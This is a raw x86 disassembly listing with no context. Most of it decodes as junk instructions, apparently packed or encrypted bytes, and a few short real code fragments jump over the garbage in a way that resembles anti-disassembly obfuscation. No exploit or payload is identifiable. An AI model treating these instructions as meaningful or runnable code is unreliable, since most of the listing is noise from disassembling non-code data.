  40cea4:	in     al,0x12
  40cea6:	jmp    0x5b106f50
  40ceab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceac:	(bad)  [ebp+0x2789a0a7]
  40ceb2:	add    DWORD PTR [ecx+edx*1+0x293f8e5d],esi
  40ceb9:	push   eax
  40ceba:	in     eax,dx
  40cebb:	pop    ebp
  40cebc:	js     0x40ce65
  40cebe:	les    esp,FWORD PTR [ebp+eax*4-0x2e]
  40cec2:	dec    esp
  40cec3:	jns    0x40ced6
  40cec5:	cwde   
  40cec6:	xchg   esi,eax
  40cec7:	xor    BYTE PTR [ebp+0x295ff06f],dl
  40cecd:	sbb    BYTE PTR [ecx+eax*8],0x49
  40ced1:	(bad)  [ebp+0x68fcf490]
  40ced7:	or     al,BYTE PTR ds:0x83af600b
  40cedd:	not    BYTE PTR [ecx+0x548985bd]
  40cee3:	sub    edi,DWORD PTR [edi-0x1c]
  40cee6:	xor    esi,0x408ffbe8
  40ceec:	dec    ecx
  40ceed:	xlat   BYTE PTR ds:[ebx]
  40ceee:	and    al,BYTE PTR [eax-0x2d]
  40cef1:	les    edx,FWORD PTR [eax-0x9f9dbcf]
  40cef7:	es lahf 
  40cef9:	adc    ebx,ebp
  40cefb:	hlt    
  40cefc:	subps  xmm4,XMMWORD PTR [edi-0x56]
  40cf00:	idiv   DWORD PTR [eax+0x5269da34]
  40cf06:	add    BYTE PTR ds:0xbd3cb3da,cl
  40cf0c:	sbb    bh,dl
  40cf0e:	leave  
  40cf0f:	push   eax
  40cf10:	push   esp
  40cf11:	xchg   ebx,eax
  40cf12:	mov    eax,DWORD PTR [edi+esi*1]
  40cf15:	fdiv   DWORD PTR [ebx-0x1679ce2e]
  40cf1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf1c:	sbb    ebp,DWORD PTR [ecx]
  40cf1e:	call   0x178d:0xaea490e7
  40cf25:	cwde   
  40cf26:	in     eax,dx
  40cf27:	outs   dx,DWORD PTR ds:[esi]
  40cf28:	imul   eax,DWORD PTR [ecx-0x69117755],0x6712ab62
  40cf32:	or     eax,0xc23682c5
  40cf37:	repz cwde 
  40cf39:	shl    dh,0xdf
  40cf3c:	stc    
  40cf3d:	pop    ebp
  40cf3e:	loope  0x40cec4
  40cf40:	push   ds
  40cf41:	jo     0x40cf3a
  40cf43:	(bad)  
  40cf44:	in     eax,dx
  40cf45:	popf   
  40cf46:	jg     0x40cede
  40cf48:	call   0xf3a94c55
  40cf4d:	out    dx,al
  40cf4e:	or     BYTE PTR [ecx+0x39062649],ah
  40cf54:	sbb    eax,DWORD PTR [edi+0x503361d9]
  40cf5a:	or     DWORD PTR ds:0x1f40db43,eax
  40cf60:	mov    edx,0x3c5e4538
  40cf65:	mov    DWORD PTR [edx+0x4],esi
  40cf68:	call   0xaf8e:0x345070bf
  40cf6f:	xchg   DWORD PTR [eax-0x3c],ebx
  40cf72:	adc    eax,0xba017d75
  40cf77:	push   ds
  40cf78:	mov    ebp,0xf4f96de5
  40cf7d:	data16 fnstcw WORD PTR [ecx-0x71abd171]
  40cf84:	push   ebx
  40cf85:	dec    eax
  40cf86:	outs   dx,DWORD PTR ds:[esi]
  40cf87:	(bad)  
  40cf88:	pop    ds
  40cf89:	imul   esp,DWORD PTR [eax+0x4fcdb078],0x45d5c582
  40cf93:	push   edx
  40cf94:	mov    bh,0x6c
  40cf96:	mov    esp,0x27ce3070
  40cf9b:	and    eax,0x16a81f72
  40cfa0:	pop    ebp
  40cfa1:	or     al,0xf0
  40cfa3:	mov    BYTE PTR [ecx+0x458b0845],cl
  40cfa9:	call   0xc24490e1
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	sub    eax,0x4cc98e77
  40cfcd:	mov    DWORD PTR [esi+0x7e],edi
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cf7f
  40cfd5:	adc    esi,DWORD PTR [esi]
  40cfd7:	dec    ebx
  40cfd8:	(bad)  
  40cfd9:	fld    TBYTE PTR [ecx-0x37241529]
  40cfdf:	or     eax,0x132b8bf
  40cfe4:	adc    al,0x89
  40cfe6:	push   0xa0bb1efb
  40cfeb:	(bad)  
  40cfec:	mov    dl,0x51
  40cfee:	xchg   DWORD PTR ds:0xa9203b8b,ebp
  40cff4:	xchg   ebp,eax
  40cff5:	hlt    
  40cff6:	daa    
  40cff7:	cmp    al,0xa5
  40cff9:	jbe    0x40cfde
  40cffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cffc:	stc    
  40cffd:	mov    al,ds:0x50156d16
  40d002:	cwde   
  40d003:	xor    ebp,DWORD PTR [ebx]
  40d005:	inc    eax
  40d006:	xchg   ebx,eax
  40d007:	cmp    eax,0xfb831e29
  40d00c:	jb     0x40cfe4
  40d00e:	dec    esi
  40d00f:	fwait
  40d010:	xchg   esp,ebx
  40d012:	cld    
  40d013:	jbe    0x40d004
  40d015:	mov    ah,0x8
  40d017:	pop    ecx
  40d018:	mov    bh,0xe1
  40d01a:	push   0xfffffff2
  40d01c:	push   edi
  40d01d:	dec    ebp
  40d01e:	push   0x4c
  40d020:	xchg   edi,eax
  40d021:	mov    ch,0xca
  40d023:	ret    
  40d024:	mov    eax,0xed91ee99
  40d029:	fdiv   DWORD PTR [ecx-0x25a238d5]
  40d02f:	sub    eax,0x30ff8810
  40d034:	out    0x51,al
  40d036:	aaa    
  40d037:	adc    al,0x5c
  40d039:	xchg   BYTE PTR [bx+di],bl
  40d03c:	in     al,0x2d
  40d03e:	sahf   
  40d03f:	ret    0x324f
  40d042:	xchg   esp,eax
  40d043:	lds    ebp,FWORD PTR [eax-0x16071142]
  40d049:	pop    eax
  40d04a:	and    bl,ch
  40d04c:	push   eax
  40d04d:	cmp    DWORD PTR [esp+ebx*8+0x61],ecx
  40d051:	xor    edx,esp
  40d053:	in     al,dx
  40d054:	pop    edi
  40d055:	stos   DWORD PTR es:[edi],eax
  40d056:	push   ss
  40d057:	mov    ds:0x875a375,al
  40d05c:	dec    eax
  40d05d:	push   esp
  40d05e:	mov    eax,0x9c662c59
  40d063:	fist   DWORD PTR [ecx]
  40d065:	mov    WORD PTR [ebx-0x5b],ds
  40d068:	ficomp WORD PTR [edx-0x19]
  40d06b:	mov    bl,0xfb
  40d06d:	imul   BYTE PTR [eax+0x32]
  40d070:	push   0xa06885aa
  40d075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d076:	xor    edi,DWORD PTR ds:0xa1b48871
  40d07c:	ds sub eax,0x37b7cd9f
  40d082:	mov    bl,0x2b
  40d084:	repnz imul ecx,DWORD PTR [ecx],0x6f427448
  40d08b:	pop    eax
  40d08c:	sub    ah,BYTE PTR [edx-0x5e]
  40d08f:	xchg   ecx,eax
  40d090:	outs   dx,BYTE PTR ds:[esi]
  40d091:	xor    DWORD PTR [ecx],esi
  40d093:	mul    DWORD PTR ds:0xc7c17c9c
  40d099:	pop    ebp
  40d09a:	cmc    
  40d09b:	mov    dh,0x0
  40d09d:	popa   
  40d09e:	retf   0xa3a8
  40d0a1:	dec    edx
  40d0a2:	fwait
  40d0a3:	sbb    DWORD PTR [edi+0xbda5b0],ecx
  40d0a9:	repz adc al,al
  40d0ac:	mov    ebp,0xc660e51
  40d0b1:	cmc    
  40d0b2:	dec    edi
  40d0b3:	out    0x9b,eax
  40d0b5:	inc    esp
  40d0b6:	fisub  DWORD PTR [ecx+0x33d88035]
  40d0bc:	test   eax,0xa1fbbb76
  40d0c1:	test   BYTE PTR [ebp+0x11],ah
  40d0c4:	inc    esp
  40d0c5:	(bad)  
  40d0c6:	sar    DWORD PTR [ecx],cl
  40d0c8:	fcomp  st(6)
  40d0ca:	inc    ebp
  40d0cb:	mov    ebp,0x90965133
  40d0d0:	test   BYTE PTR [edi-0x189733b5],0x46
  40d0d7:	(bad)  
  40d0d8:	fs jg  0x40d120
  40d0db:	cmp    BYTE PTR [ecx+0x1a],cl
  40d0de:	leave  
  40d0df:	clc    
  40d0e0:	fcmovu st,st(0)
  40d0e2:	out    dx,al
  40d0e3:	pop    ecx
  40d0e4:	mov    cl,0x7c
  40d0e6:	(bad)  
  40d0e7:	xchg   ecx,eax
  40d0e8:	dec    eax
  40d0e9:	add    eax,0x11ffa218
  40d0ee:	fld    TBYTE PTR [edi]
  40d0f0:	jne    0x40d074
  40d0f2:	cmp    al,0x3f
  40d0f4:	test   DWORD PTR [ecx],ebp
  40d0f6:	jle    0x40d123
  40d0f8:	cmp    dh,0x74
  40d0fb:	test   DWORD PTR [eax],ebp
  40d0fd:	in     eax,0x9c
  40d0ff:	cld    
  40d100:	inc    ebx
  40d101:	mov    cl,0x6b
  40d103:	mov    eax,ds:0xd4d480ea
  40d108:	test   eax,0xe388256d
  40d10d:	loope  0x40d09f
  40d10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d110:	add    al,0x1a
  40d112:	cwde   
  40d113:	push   esi
  40d114:	jp     0x40d149
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	add    dl,0x20
  40d160:	add    edx,eax
  40d162:	or     eax,0x3f7e7e8b
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d11e
  40d16b:	shl    DWORD PTR [edx-0x1c4b1fe0],0xa5
  40d172:	push   edx
  40d173:	xchg   ebp,eax
  40d174:	or     BYTE PTR [esi+0x48],bh
  40d177:	add    BYTE PTR [eax-0x1a0eaabe],bl
  40d17d:	sbb    eax,0xc068203
  40d182:	xchg   BYTE PTR [esi],dh
  40d184:	in     eax,0x4f
  40d186:	push   0xffffff88
  40d188:	cmp    ebx,DWORD PTR [ebp+0x63e1892c]
  40d18e:	pushf  
  40d18f:	shl    DWORD PTR [eax-0x2ba2090a],cl
  40d195:	sub    BYTE PTR [eax+esi*2],0x37
  40d199:	in     eax,dx
  40d19a:	cmp    eax,0x909d97b2
  40d19f:	aam    0x42
  40d1a1:	shl    DWORD PTR [esi],1
  40d1a3:	xchg   edi,eax
  40d1a4:	jb     0x40d1f7
  40d1a6:	imul   DWORD PTR [edx]
  40d1a8:	mov    al,ds:0x3620cbdd
  40d1ad:	adc    DWORD PTR [esi+0x2b1b7fb8],eax
  40d1b3:	les    ecx,FWORD PTR [esi-0x229909cd]
  40d1b9:	lds    ebx,FWORD PTR [ecx+0x168b49d4]
  40d1bf:	add    al,0xb8
  40d1c1:	sub    BYTE PTR [eax+0x27],0x7f
  40d1c5:	inc    ecx
  40d1c6:	pop    eax
  40d1c7:	add    bh,BYTE PTR [eax]
  40d1c9:	xchg   ecx,ecx
  40d1cb:	sub    DWORD PTR [edx-0x5],0x6a10219c
  40d1d2:	mov    eax,0xb1f7dcd5
  40d1d7:	rcl    ah,1
  40d1d9:	mov    ecx,0xaba3daab
  40d1de:	inc    edx
  40d1df:	loopne 0x40d1b5
  40d1e1:	cdq    
  40d1e2:	add    eax,0xba6ed2a1
  40d1e7:	mov    ds:0x9fe7e1a4,al
  40d1ec:	inc    esi
  40d1ed:	and    DWORD PTR [edi],ebx
  40d1ef:	pushf  
  40d1f0:	enter  0xc22d,0xbb
  40d1f4:	xor    BYTE PTR [eax-0x4690b9c7],ch
  40d1fa:	fucomip st,st(3)
  40d1fc:	outs   dx,BYTE PTR ds:[esi]
  40d1fd:	lahf   
  40d1fe:	jge    0x40d1ee
  40d200:	lahf   
  40d201:	add    al,0x79
  40d203:	jnp    0x40d1df
  40d205:	sub    BYTE PTR [esi-0x1f6adc58],dh
  40d20b:	and    edi,DWORD PTR [esi-0x285fa81a]
  40d211:	sbb    al,bh
  40d213:	xor    eax,0x5a28a0cb
  40d218:	mov    ebx,DWORD PTR [ecx+0x7b]
  40d21b:	repnz outs dx,BYTE PTR ds:[esi]
  40d21d:	(bad)  
  40d21e:	jge    0x40d1f1
  40d220:	addr16 call 0x2e04:0xc60deaff
  40d228:	outs   dx,DWORD PTR ds:[esi]
  40d229:	call   0xb63b:0xc34f742a
  40d230:	clc    
  40d231:	js     0x40d254
  40d233:	xor    ebx,eax
  40d235:	cmp    ebp,DWORD PTR ss:[edx+0x2e6df971]
  40d23c:	inc    esp
  40d23d:	xchg   esp,eax
  40d23e:	xor    BYTE PTR [ebx+0x4d57cfde],0x8
  40d245:	sar    DWORD PTR [edi],0xd7
  40d248:	int3   
  40d249:	ins    BYTE PTR es:[edi],dx
  40d24a:	push   esi
  40d24b:	jo     0x40d225
  40d24d:	rcl    al,cl
  40d24f:	pop    ss
  40d250:	std    
  40d251:	test   al,0x10
  40d253:	dec    edx
  40d254:	jl     0x40d28c
  40d256:	call   0xfdbc:0xf231070a
  40d25d:	retf   0x2c60
  40d260:	or     al,0xf1
  40d262:	or     al,0xbd
  40d264:	cmp    bh,BYTE PTR [esi+0x1cb10dfe]
  40d26a:	xor    eax,ebx
  40d26c:	jno    0x40d27a
  40d26e:	popf   
  40d26f:	dec    DWORD PTR [edi+eiz*1+0x47]
  40d273:	push   ebx
  40d274:	push   esp
  40d275:	imul   ebx,esi,0xfffffff1
  40d278:	cs pop esi
  40d27a:	sbb    eax,DWORD PTR [edx+eiz*2-0x52518a27]
  40d281:	jecxz  0x40d2f6
  40d283:	sub    al,0x66
  40d285:	and    ah,BYTE PTR [edx+eiz*4-0x5f]
  40d289:	add    al,0x95
  40d28b:	cs cli 
  40d28d:	push   edx
  40d28e:	pop    ds
  40d28f:	inc    ebp
  40d290:	inc    ebp
  40d291:	mov    ah,0x3b
  40d293:	imul   eax,ebp,0x53
  40d296:	sbb    eax,0xb0e1ca3b
  40d29b:	std    
  40d29c:	outs   dx,DWORD PTR ds:[esi]
  40d29d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d29e:	cmp    eax,0xe2934178
  40d2a3:	add    al,BYTE PTR [eax]
  40d2a5:	sub    ch,BYTE PTR [edx-0x4727cc6f]
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	dec    ecx
  40d2e2:	fsub   st(3),st
  40d2e4:	aas    
  40d2e5:	into   
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d2a5
  40d2ee:	mov    edi,0xa20f915d
  40d2f3:	in     eax,0xcd
  40d2f5:	push   ebx
  40d2f6:	xchg   DWORD PTR [ebp-0x79],ebp
  40d2f9:	scas   eax,DWORD PTR es:[edi]
  40d2fa:	mov    ebp,0xad9d5884
  40d2ff:	pop    ebx
  40d300:	xchg   BYTE PTR [edi+0x76],bl
  40d303:	or     eax,0xd520af89
  40d308:	iret   
  40d309:	pop    ds
  40d30a:	mov    edx,0x873277ed
  40d30f:	test   DWORD PTR [ecx],0x2e2c65b2
  40d315:	lea    ebp,[esi+eiz*4]
  40d318:	jb     0x40d368
  40d31a:	mov    bh,0x43
  40d31c:	add    eax,0x2ddb099e
  40d321:	icebp  
  40d322:	ret    
  40d323:	or     ecx,DWORD PTR [ecx+0x66da8bb0]
  40d329:	or     al,0x3f
  40d32b:	push   cs
  40d32c:	add    BYTE PTR gs:[esp+eiz*8+0x59928805],dl
  40d334:	lahf   
  40d335:	add    esi,DWORD PTR [edx+0x61a440d9]
  40d33b:	adc    al,BYTE PTR [edx+0xb]
  40d33e:	push   0xf
  40d340:	jl     0x40d31a
  40d342:	out    dx,eax
  40d343:	dec    edx
  40d344:	loopne 0x40d3a6
  40d346:	cmp    ah,cl
  40d348:	fwait
  40d349:	popa   
  40d34a:	fisttp DWORD PTR [edx-0x3927af09]
  40d350:	shr    bl,cl
  40d352:	and    BYTE PTR [eax-0x46357cc1],bl
  40d358:	out    dx,al
  40d359:	mov    bh,0xa2
  40d35b:	dec    ebp
  40d35c:	cdq    
  40d35d:	inc    eax
  40d35e:	fwait
  40d35f:	test   eax,0x4554b951
  40d364:	push   esi
  40d365:	mov    WORD PTR [edi-0x7b902704],gs
  40d36b:	shl    BYTE PTR [esi-0xc6b55a],1
  40d371:	rcl    BYTE PTR [edx-0x223a1e2e],cl
  40d377:	dec    esp
  40d378:	lods   al,BYTE PTR ds:[esi]
  40d379:	(bad)  
  40d37a:	xor    esi,DWORD PTR [esi+0x76]
  40d37d:	ficomp WORD PTR [ecx-0x13cfb5a8]
  40d383:	xor    cl,BYTE PTR [edi-0x7a]
  40d386:	pop    ecx
  40d387:	sub    esi,ebp
  40d389:	add    ch,BYTE PTR [edx]
  40d38b:	pop    ecx
  40d38c:	jecxz  0x40d359
  40d38e:	xchg   edx,eax
  40d38f:	in     eax,dx
  40d390:	inc    ebp
  40d391:	pop    ebp
  40d392:	sar    BYTE PTR [ebx-0x2c],cl
  40d395:	stc    
  40d396:	addr16 fsub st,st(0)
  40d399:	jle    0x40d394
  40d39b:	or     DWORD PTR [edi+0x55],edx
  40d39e:	inc    edx
  40d39f:	sub    al,0x87
  40d3a1:	and    dh,BYTE PTR [eax]
  40d3a3:	push   edi
  40d3a4:	mov    eax,0x96898ce
  40d3a9:	adc    BYTE PTR [eax+0x6f],ch
  40d3ac:	pop    ebp
  40d3ad:	sti    
  40d3ae:	fwait
  40d3af:	pop    edi
  40d3b0:	inc    ebp
  40d3b1:	xor    al,0x5d
  40d3b3:	loop   0x40d3c3
  40d3b5:	fimul  DWORD PTR [ecx-0x66]
  40d3b8:	shl    DWORD PTR [ebp-0x70],1
  40d3bb:	or     cl,al
  40d3bd:	ds jns 0x40d343
  40d3c0:	pop    ss
  40d3c1:	mov    ch,0x65
  40d3c3:	ret    
  40d3c4:	inc    esi
  40d3c5:	lea    ebp,[ecx]
  40d3c7:	xlat   BYTE PTR ds:[ebx]
  40d3c8:	enter  0x38c8,0x9e
  40d3cc:	and    eax,0x4512f022
  40d3d1:	popa   
  40d3d2:	scas   eax,DWORD PTR es:[edi]
  40d3d3:	cmp    al,0xb4
  40d3d5:	in     al,0x28
  40d3d7:	les    ecx,FWORD PTR cs:[esp+eax*4]
  40d3db:	pop    ebx
  40d3dc:	call   FWORD PTR [ecx+0x22]
  40d3df:	jp     0x40d455
  40d3e1:	(bad)  
  40d3e2:	je     0x40d3ce
  40d3e4:	outs   dx,BYTE PTR ds:[esi]
  40d3e5:	clc    
  40d3e6:	icebp  
  40d3e7:	mov    al,ds:0xc13e15fb
  40d3ec:	mov    cl,0xdc
  40d3ee:	add    eax,0x4d9d3c8
  40d3f3:	jmp    0xb8f7fd54
  40d3f8:	push   eax
  40d3f9:	xor    al,0x30
  40d3fb:	stos   BYTE PTR es:[edi],al
  40d3fc:	addr16 xchg esp,eax
  40d3fe:	pop    eax
  40d3ff:	xlat   BYTE PTR ds:[ebx]
  40d400:	outs   dx,DWORD PTR ds:[esi]
  40d401:	mov    bl,0xed
  40d403:	imul   esi,DWORD PTR [bx-0x52],0xb92416bf
  40d40b:	mov    ebp,0x137978f9
  40d410:	sub    DWORD PTR [eax],ebp
  40d412:	cmp    eax,0xe00fdbba
  40d417:	ret    
  40d418:	aaa    
  40d419:	addr16 xchg ebp,eax
  40d41b:	adc    al,0x84
  40d41d:	xchg   BYTE PTR [ecx-0x2afd5181],ah
  40d423:	mov    eax,0x10ba2c7c
  40d428:	les    ebx,FWORD PTR ds:0x14a5de29
  40d42e:	mov    edx,DWORD PTR [ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	shr    ch,0x7a
  40d44c:	sub    DWORD PTR [edi+0x3f7e7e8d],ecx
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d471
  40d456:	(bad)  
  40d457:	cmc    
  40d458:	mov    ah,BYTE PTR [ecx-0x3aa2b642]
  40d45e:	das    
  40d45f:	jne    0x40d480
  40d461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d462:	test   BYTE PTR [edx-0x4f],bl
  40d465:	sub    ebp,edx
  40d467:	pop    esp
  40d468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d469:	sbb    edx,ebp
  40d46b:	and    edx,DWORD PTR [ebp+edi*1-0x44fcec47]
  40d472:	popf   
  40d473:	nop
  40d474:	ins    DWORD PTR es:[edi],dx
  40d475:	mov    bh,0x92
  40d477:	clc    
  40d478:	jno    0x40d40b
  40d47a:	lahf   
  40d47b:	mov    edi,0xccc6f30
  40d480:	pusha  
  40d481:	retf   
  40d482:	sbb    dl,BYTE PTR [edx+esi*8]
  40d485:	pushf  
  40d486:	fs sub al,0xcd
  40d489:	loopne 0x40d48e
  40d48b:	sub    dl,bh
  40d48d:	jns    0x40d506
  40d48f:	in     eax,0x7b
  40d491:	ins    BYTE PTR es:[edi],dx
  40d492:	adc    DWORD PTR [ebx],eax
  40d494:	test   BYTE PTR [esi],dh
  40d496:	sti    
  40d497:	mov    edx,0xc5886902
  40d49c:	pause  
  40d49e:	in     al,0xeb
  40d4a0:	test   eax,0x5755bae1
  40d4a5:	aam    0x31
  40d4a7:	mov    al,ds:0xed79d2cd
  40d4ac:	cli    
  40d4ad:	sbb    ecx,0x717a5e7b
  40d4b3:	rcr    ecx,cl
  40d4b5:	jns    0x40d4fc
  40d4b7:	or     eax,0x301f87d5
  40d4bc:	test   al,0x8e
  40d4be:	pop    esp
  40d4bf:	dec    edi
  40d4c0:	fld    QWORD PTR [eax-0x77]
  40d4c3:	mov    esi,0x2d9d311d
  40d4c8:	mov    bh,0x1d
  40d4ca:	stos   BYTE PTR es:[edi],al
  40d4cb:	(bad)  [ecx*2-0x5e21a9e6]
  40d4d2:	xor    DWORD PTR [edi],ecx
  40d4d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d5:	scas   eax,DWORD PTR es:[edi]
  40d4d6:	and    eax,esp
  40d4d8:	enter  0x21cf,0xce
  40d4dc:	add    eax,0xd2ffd014
  40d4e1:	mov    DWORD PTR [esi+edi*2-0x606e99b8],ebx
  40d4e8:	push   ebx
  40d4e9:	out    dx,eax
  40d4ea:	adc    al,0x14
  40d4ec:	aas    
  40d4ed:	add    DWORD PTR [eax],eax
  40d4ef:	out    dx,al
  40d4f0:	out    0x27,eax
  40d4f2:	push   0xc0235c9f
  40d4f7:	add    ecx,DWORD PTR [edi+edi*1+0x6c]
  40d4fb:	rcr    ah,cl
  40d4fd:	pop    esi
  40d4fe:	adc    esp,DWORD PTR [esi]
  40d500:	jp     0x40d56d
  40d502:	call   0xb9b5:0xfe842ad1
  40d509:	imul   ecx,ebx,0xffffffec
  40d50c:	xor    DWORD PTR [ecx-0x4d],esp
  40d50f:	sar    DWORD PTR [esp+eax*2+0x4],1
  40d513:	xchg   edx,eax
  40d514:	pop    ebx
  40d515:	push   ds
  40d516:	jle    0x40d4a3
  40d518:	in     eax,dx
  40d519:	jo     0x40d56a
  40d51b:	dec    ebp
  40d51c:	ss scas al,BYTE PTR es:[edi]
  40d51e:	add    ebx,DWORD PTR [eax-0x5231fbb2]
  40d524:	push   0xfffffff6
  40d526:	bound  edx,QWORD PTR [ebx]
  40d528:	pop    edx
  40d529:	xor    BYTE PTR [edi+0x69407f10],bl
  40d52f:	sbb    ebp,DWORD PTR [eax+0x30]
  40d532:	mov    ah,0x71
  40d534:	or     al,0xb3
  40d536:	fcmovbe st,st(2)
  40d538:	ins    DWORD PTR es:[edi],dx
  40d539:	add    dl,BYTE PTR [eax+0xd]
  40d53c:	adc    DWORD PTR [esi+0x19],eax
  40d53f:	adc    eax,0x7c4867bc
  40d544:	enter  0xe8d5,0x11
  40d548:	pop    eax
  40d549:	mov    edx,0xf67b9057
  40d54e:	adc    dh,al
  40d550:	mov    ah,0x13
  40d552:	daa    
  40d553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d554:	inc    edi
  40d555:	push   0x7ad85eaf
  40d55a:	loope  0x40d5a1
  40d55c:	ja     0x40d572
  40d55e:	inc    edi
  40d55f:	sbb    DWORD PTR [edi+eiz*4-0x651b2a78],eax
  40d566:	xchg   ebp,eax
  40d567:	outs   dx,DWORD PTR ds:[esi]
  40d568:	aam    0xad
  40d56a:	hlt    
  40d56b:	adc    eax,0x597a4969
  40d570:	cs dec esi
  40d572:	mov    ebp,0x2834d6ef
  40d577:	mov    ch,0x3f
  40d579:	(bad)  
  40d57b:	pop    edx
  40d57c:	add    dl,dl
  40d57e:	jge    0x40d524
  40d580:	ins    DWORD PTR es:[edi],dx
  40d581:	xchg   BYTE PTR [esi+edx*4-0x24],ch
  40d585:	mov    WORD PTR [edi+0x1ede95a1],es
  40d58b:	(bad)  
  40d58c:	mov    cl,0x51
  40d58e:	mov    dl,0x6c
  40d590:	aad    0x8e
  40d592:	sbb    eax,ebx
  40d594:	js     0x40d59e
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0x2341fe4c
  40d5ac:	dec    ecx
  40d5ad:	mov    eax,0x7e7e8e40
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d5e4
  40d5b7:	add    edx,DWORD PTR [edi+0x32bc8541]
  40d5bd:	pop    edx
  40d5be:	aas    
  40d5bf:	sbb    ebx,DWORD PTR [ebp+0x2]
  40d5c2:	add    eax,0xe9c3160e
  40d5c7:	lods   al,BYTE PTR ds:[esi]
  40d5c8:	pop    ss
  40d5c9:	out    dx,eax
  40d5ca:	push   es
  40d5cb:	sbb    eax,0xa1b4b789
  40d5d0:	pop    edi
  40d5d1:	ret    
  40d5d2:	push   esi
  40d5d3:	xlat   BYTE PTR ds:[ebx]
  40d5d4:	call   ebp
  40d5d6:	dec    esp
  40d5d7:	jb     0x40d5cc
  40d5d9:	rol    DWORD PTR [ecx],0x1b
  40d5dc:	fld    TBYTE PTR [ebx-0x39]
  40d5df:	enter  0x65c3,0xd0
  40d5e3:	ds pop ebx
  40d5e5:	retf   0x9406
  40d5e8:	inc    edx
  40d5e9:	repz add dh,ah
  40d5ec:	jg     0x40d5af
  40d5ee:	fwait
  40d5ef:	test   eax,0x4965d062
  40d5f4:	xor    BYTE PTR [ecx+0x6e],bh
  40d5f7:	xor    esi,DWORD PTR [edi+0x57c3e9fb]
  40d5fd:	pop    ecx
  40d5fe:	stc    
  40d5ff:	cs js  0x40d640
  40d602:	jns    0x40d5b6
  40d604:	pop    ecx
  40d605:	sbb    ebp,0x7
  40d608:	mov    edx,0x38b54051
  40d60d:	out    dx,eax
  40d60e:	test   eax,0x995d6a19
  40d613:	xor    BYTE PTR [edx-0x38],0x48
  40d617:	test   al,0x8d
  40d619:	jl     0x40d655
  40d61b:	adc    dh,BYTE PTR ds:0x2f777140
  40d621:	mov    dh,0x75
  40d623:	push   ss
  40d624:	mov    ?,eax
  40d626:	xlat   BYTE PTR ds:[ebx]
  40d627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d628:	jne    0x40d639
  40d62a:	mov    ecx,0x643f764
  40d62f:	stos   BYTE PTR es:[edi],al
  40d630:	pop    ebp
  40d631:	sbb    esi,DWORD PTR [ecx+0x4355d14]
  40d637:	out    0x4f,eax
  40d639:	mov    al,ds:0x88265208
  40d63e:	xor    eax,0xc79336c0
  40d643:	fnstcw WORD PTR ds:0xce80785
  40d649:	push   ebp
  40d64a:	pop    edi
  40d64b:	data16 and bl,cl
  40d64e:	and    eax,0xe2d39be
  40d653:	ror    DWORD PTR [eax],1
  40d655:	mov    dh,0x11
  40d657:	jmp    0xecd9c23e
  40d65c:	xchg   ecx,eax
